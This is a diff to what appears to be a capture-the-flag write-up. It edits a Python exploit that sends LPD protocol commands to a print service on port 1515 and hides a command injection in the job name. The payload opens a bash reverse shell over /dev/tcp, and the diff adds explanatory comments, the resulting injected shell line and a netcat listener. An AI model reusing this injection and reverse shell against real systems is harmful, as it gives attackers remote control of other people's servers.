@@ -110,36 +110,52 @@ sock = socket.socket()
 sock.connect((MACHINE_IP, 1515)) # Connection Establishment: Creates a TCP socket and establishes connection to the target LPD service on port 1515.  
 
 # Step 1: Init queue
-sock.send(b'\x02archive_intake\n') # Sends the print job submission command (\x02) followed by the valid queue name archive_intake and a newline delimiter.  
+sock.send(b'\x02archive_intake\n') 
 time.sleep(0.3)
 sock.recv(1024)
+# Sends the print job submission command (\x02) followed by the valid queue name archive_intake and a newline delimiter.  
+# The sleep(0.3) allows the server time to process the request. The recv(1024) consumes the server's acknowledgment (ACK byte \x00).  
 
 # Step 2: Payload
-job = f"J'; bash -c \"bash -i >& /dev/tcp/{YOUR_IP}/{YOUR_PORT} 0>&1\" #\n"
-header = b'\x02' + str(len(job)).encode() + b'\n'
+job = f"J'; bash -c \"bash -i >& /dev/tcp/{YOUR_IP}/{YOUR_PORT} 0>&1\" #\n" # 
+header = b'\x02' + str(len(job)).encode() + b'\n'  
 sock.send(header)
 time.sleep(0.3)
 sock.recv(1024)
+
+# Payload Construction: The job name string begins with J (LPD job name marker), followed by a single quote that closes the echo string in the vulnerable subprocess command.    
+# The bash command creates an interactive reverse shell using /dev/tcp.  
+# Header Creation: The header contains:    
+# - \x02 - File data submission command  
+# - len(job) - Payload size in ASCII (e.g., "95")  
+# - \n - Newline delimiter  
+# The server reads this header and waits for exactly the specified number of bytes.  
 
 # Step 3: Send Payload
 sock.send(job.encode())
 time.sleep(0.3)
 sock.recv(1024)
-
+# Sends the actual payload data. The .encode() converts the Python string to UTF-8 bytes. The server receives this data and extracts the job name by searching for the line starting with J.  
 # Step 4: Finalize
 sock.send(b'\x03\x00\n')
 time.sleep(1)
 sock.close()
+# Completion Signal: Sends the LPD "end of job" command (\x03), which triggers server-side processing  
 
 print('[+] Exploit sent!')
 ```
-
-
-
-
-
-
-
-
-
-
+The extracted job_name is:  
+```
+'; bash -c "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1" #  
+```
+This transforms the subprocess command into:  
+```
+echo 'Archive: '; bash -c "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1" #' >> /tmp/archive.log  
+```
+### Listener Setup + run exploit
+```
+nc -lvnp 4443
+```
+```
+python exploit.py
+```
